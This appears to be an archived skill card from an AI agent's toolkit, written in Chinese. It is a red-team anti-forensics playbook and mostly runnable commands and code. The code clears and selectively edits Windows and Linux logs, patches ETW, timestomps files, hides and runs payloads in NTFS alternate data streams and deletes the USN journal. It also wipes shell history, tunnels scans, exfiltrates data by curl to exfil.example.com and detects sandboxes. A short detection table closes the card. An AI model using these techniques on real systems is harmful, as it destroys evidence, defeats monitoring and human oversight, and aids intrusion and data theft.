<!-- archived from /root/.hermes/skills/security/redteam-anti-forensics/SKILL.md on 2026-10-21 -->

---
name: redteam-anti-forensics
description: |
  红队反取证方法论：日志清理（Windows 事件日志/Linux syslog/journal）、
  时间戳篡改（Timestomp/touch -r/debugfs ctime）、文件系统反取证（NTFS ADS/安全删除）、
  磁盘工件操纵（MFT/USN Journal）、内存工件清除、网络取证规避、沙箱检测。
  MITRE ATT&CK T1070（痕迹清除）全系列。
  触发词：anti-forensics、log clearing、timestomp、ADS、secure delete、
  USN journal、history clearing、ETW blind、evidence destruction、痕迹清理。
version: "1.0"
---

> 归档卡：原目录 `/root/.hermes/skills/security/redteam-anti-forensics`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/redteam-anti-forensics/…')`，不要相对 `references/legacy/` 解析。

# 红队反取证 — 痕迹清理方法论

> 来源：claude-red `offensive-anti-forensics` 适配 + 本库 `redteam-opsec` / `sig_cleanup_scan.py` 补充。
> 与 `host-ir-check`（蓝队排后门）互为镜像：本卡是红队视角的痕迹销毁。

## 核心原则

- 每个动作都生成证据——日志、时间戳、内存结构、磁盘元数据、网络捕获都在讲故事
- 目标是**控制叙事**，不是完全消除（完全消除本身就是可疑的）
- **选择性编辑 > 全量删除**——删掉所有日志比编辑掉自己的条目更吵
- 授权范围内操作。记录你清理了什么——报告里要说明

## 快速工作流

1. **载荷执行前**——枚举目标日志基础设施，了解什么会产生证据
2. **第一时间致盲遥测源**（ETW/Sysmon/auditd）
3. **执行操作**——尽量 in-memory，减少落盘
4. **篡改时间戳**——blend 到周围文件的时间线
5. **选择性编辑日志**——只删自己的条目，不全删
6. **清除内存工件**——如果预期会有内存取证
7. **验证清理效果**——用取证分析师的视角检查残留

---

## Windows 事件日志清理

### wevtutil 方法

```cmd
rem 只清特定通道（比全清低调）
wevtutil cl Security
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Microsoft-Windows-Sysmon/Operational"

rem 清之前备份（留给自己的报告）
wevtutil epl Security C:\Windows\Temp\sec_backup.evtx
wevtutil cl Security
```

### ETW Provider 致盲

比事后清日志更安静——从源头阻止日志生成：

```csharp
// 在当前进程中 patch ntdll!EtwEventWrite
IntPtr ntdll = GetModuleHandle("ntdll.dll");
IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
VirtualProtect(etwAddr, 1, 0x40, out uint oldProtect);
Marshal.WriteByte(etwAddr, 0xC3);  // RET
VirtualProtect(etwAddr, 1, oldProtect, out _);
```

> **注意**：Defender 1.417+ 会在 ~50ms 内重新 hook 常见字节 patch。
> 更隐蔽方案：COM VTable hook / VEH 硬件断点 / PowerShell Runspace（patchless）。

### Invoke-Phant0m

杀掉事件日志服务的写线程——服务看起来在跑，但不写任何事件：

```powershell
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m
```

---

## Linux 日志清理

### Syslog / Auth 日志

```bash
# 截断（保留 inode，比删除低调）
truncate -s 0 /var/log/syslog
truncate -s 0 /var/log/auth.log

# 选择性删除——只删自己 IP 的行
sed -i '/10.10.14.5/d' /var/log/auth.log
sed -i '/10.10.14.5/d' /var/log/syslog

# 处理 rotated 日志
for f in /var/log/auth.log.*; do
  if file "$f" | grep -q gzip; then
    gunzip "$f"; sed -i '/10.10.14.5/d' "${f%.gz}"; gzip "${f%.gz}"
  else
    sed -i '/10.10.14.5/d' "$f"
  fi
done
```

### Systemd Journal

```bash
journalctl --flush --rotate
journalctl --vacuum-time=1s
# 或保留少量正常条目
journalctl --vacuum-size=10M
```

### utmp/wtmp 二进制编辑

```bash
# 用 utmpdump 编辑（二进制文件不能 sed）
utmpdump /var/log/wtmp > /tmp/wtmp.txt
grep -v "your_username" /tmp/wtmp.txt > /tmp/wtmp_clean.txt
utmpdump -r < /tmp/wtmp_clean.txt > /var/log/wtmp
rm /tmp/wtmp.txt /tmp/wtmp_clean.txt
```

---

## 时间戳篡改

### Windows Timestomp

```powershell
# 匹配系统文件的时间戳
$ref = Get-Item C:\Windows\System32\notepad.exe
$target = Get-Item C:\Windows\Temp\payload.exe
$target.CreationTime = $ref.CreationTime
$target.LastWriteTime = $ref.LastWriteTime
$target.LastAccessTime = $ref.LastAccessTime
```

### Linux touch

```bash
# 克隆参考文件的时间戳
touch -r /usr/bin/ssh /tmp/payload

# 批量规范化
find /opt/tools -type f -exec touch -r /usr/bin/ls {} \;

# ctime 需要 debugfs（ext4）
debugfs -w /dev/sda1 -R "set_inode_field /tmp/payload ctime 202501150830"
```

---

## 文件系统反取证

### NTFS ADS（备用数据流）

```cmd
rem 隐藏 payload 到 ADS
type payload.exe > C:\Users\Public\readme.txt:payload.exe

rem 从 ADS 执行
wmic process call create "C:\Users\Public\readme.txt:payload.exe"

rem 列出 ADS
dir /r C:\Users\Public\readme.txt
```

### 安全删除

```cmd
rem Windows: SDelete
sdelete -p 3 C:\Windows\Temp\payload.exe
rem 覆写空闲空间
cipher /w:C:\Windows\Temp
```

```bash
# Linux: shred
shred -vfz -n 3 /tmp/payload
shred -u /tmp/payload  # 删除

# SSD: TRIM 不保证销毁，但加速回收
fstrim -v /
```

---

## 磁盘工件操纵

### MFT 和 USN Journal

```cmd
rem 删除 USN Journal
fsutil usn deletejournal /d C:

rem 禁止 USN Journal 创建
fsutil usn deletejournal /n C:

rem 查询 USN Journal 看自己留了什么
fsutil usn readjournal C: csv > usn_dump.csv
findstr /i "payload" usn_dump.csv
```

---

## 内存工件清除

```powershell
# PowerShell 命令历史
Remove-Item (Get-PSReadlineOption).HistorySavePath -EA SilentlyContinue
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

```bash
# Bash 历史
unset HISTFILE
export HISTSIZE=0
history -c
rm -f ~/.bash_history
set +o history

# SSH agent 凭据
ssh-add -D

# 换进程壳（甩掉内存工件）
exec bash --norc --noprofile
```

---

## 网络取证规避

```bash
# DNS-over-HTTPS 绕过 DNS 日志
# C2 解析走 DoH（Cloudflare/Google）

# SSH 隧道加密横向流量
ssh -D 9050 -f -N pivot@10.10.10.5
proxychains nmap -sT 172.16.0.0/24

# 加密外泄数据
tar czf - /data | openssl enc -aes-256-cbc -pbkdf2 -pass pass:Key | \
  curl -X POST --data-binary @- https://exfil.example.com/upload
```

---

## 沙箱 / VM 检测

```powershell
$checks = @{
    LowMemory  = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory -lt 2GB
    FewCores   = (Get-CimInstance Win32_Processor).NumberOfCores -lt 2
    SmallDisk  = (Get-CimInstance Win32_DiskDrive | Measure-Object -Property Size -Sum).Sum -lt 60GB
    RecentBoot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime -gt (Get-Date).AddMinutes(-5)
    NoUserFiles = (Get-ChildItem "$env:USERPROFILE\Documents" -EA SilentlyContinue).Count -lt 3
}
if ($checks.Values -contains $true) { exit }
```

---

## 检测 / 防守视角

| 工件类别 | 检测信号 |
|----------|----------|
| 日志清理 | EventID 1102（安全日志被清）、EventID 104（系统日志被清）|
| 时间戳篡改 | `$STANDARD_INFORMATION` 与 `$FILE_NAME` 不匹配 |
| USN 删除 | USN Journal 缺失或创建时间极新 |
| 日志截断 | 文件修改时间新但大小为 0 |
| Shell 历史 | `.bash_history` 缺失或修改时间新但为空 |
| Sysmon | EventID 2 记录文件创建时间变更 |
| ETW patch | ntdll 中 `EtwEventWrite` 被 inline hook 或 RET |
| ADS | Streams.exe / `Get-Item -Stream *` 枚举 |
| Prefetch/Shimcache | 删掉 exe 后仍留有执行记录 |

---

## 与本库其他 Skill 的关系

| 需求 | 走哪张卡 |
|------|----------|
| 红队痕迹清理 | **本卡** |
| 蓝队排后门 / IR | `host-ir-check` / `digital-forensics` |
| EDR 绕过 | `edr-bypass-re` |
| 载荷特征清理 | `sig_cleanup_scan.py` / `redteam-opsec` |
| 数据外泄 | `data-exfiltration-ops` |
